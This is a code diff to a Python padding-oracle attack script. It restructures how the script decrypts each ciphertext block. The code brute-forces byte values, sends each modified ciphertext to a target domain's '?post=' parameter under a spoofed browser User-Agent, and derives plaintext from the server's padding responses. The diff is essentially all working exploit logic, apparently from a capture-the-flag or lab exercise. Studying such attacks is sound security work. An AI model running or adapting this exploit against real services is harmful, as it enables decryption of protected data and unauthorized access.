@@ -52,7 +52,7 @@ def tune_padding(byte_array, block):
         blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
         print(blocks[block][16-to_change-1])
 
-def get_plaintext(byte_position, block):
+def get_plaintext(byte_position, block, plaintext):
     # n^m^p = t {n=ciphered original block n-1, m=changed ciphered block n-1 for the correct padding, p=the padding, t=plaintext}
     n = blocks[block][byte_position]
     m = original_block[block][byte_position]
@@ -68,9 +68,10 @@ def call_oracle(domain,payload):
     response = requests.get(f"{domain}?post={payload}", headers={"User-Agent": ua.chrome})
     return padding_correct(response) 
 
-plaintext = bytearray()
-for block in reversed(range(1, len(blocks)-1)):
+def decipher_block(block):
     guesses = bytearray()
+    plaintext = bytearray()
+
     for byte_position in reversed(range(16)):
         # pre
         if byte_position<15:
@@ -78,7 +79,8 @@ for block in reversed(range(1, len(blocks)-1)):
             tune_padding(guesses, block)
         for i in range(256):
             blocks[block][byte_position] = i
-            payload=hex_to_url_b64(blocks_to_dump(blocks))
+            payload=hex_to_url_b64(blocks_to_dump([blocks[block], blocks[block+1]]))
+            print(payload)
             if call_oracle(domain, payload):
                 print(f"\033[33m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
                 if byte_position == 15:
@@ -90,7 +92,7 @@ for block in reversed(range(1, len(blocks)-1)):
                     if call_oracle(domain, payload):
                         print("\033[32m0x01 padding found!\033[0m")
                         guesses.append(i)
-                        get_plaintext(byte_position, block)
+                        get_plaintext(byte_position, block, plaintext)
                         break
                     else:
                         print("\033[35mPossible 0x02...0xFF, not adding the bytes.\033[0m")
@@ -98,7 +100,10 @@ for block in reversed(range(1, len(blocks)-1)):
                     print(f"\033[34mPrevious block back to it's original value ({blocks[block][byte_position-1]})\033[0m")
                 else:  
                     guesses.append(i)
-                    get_plaintext(byte_position, block)
+                    get_plaintext(byte_position, block, plaintext)
                     break
             else:
                 print(f"\033[31mTrying with byte value {hex(blocks[block][byte_position])} ({i}) on the {byte_position}th position of the {block}th block.\033[0m")
+
+for block in reversed(range(1, len(blocks)-1)):
+    decipher_block(block)
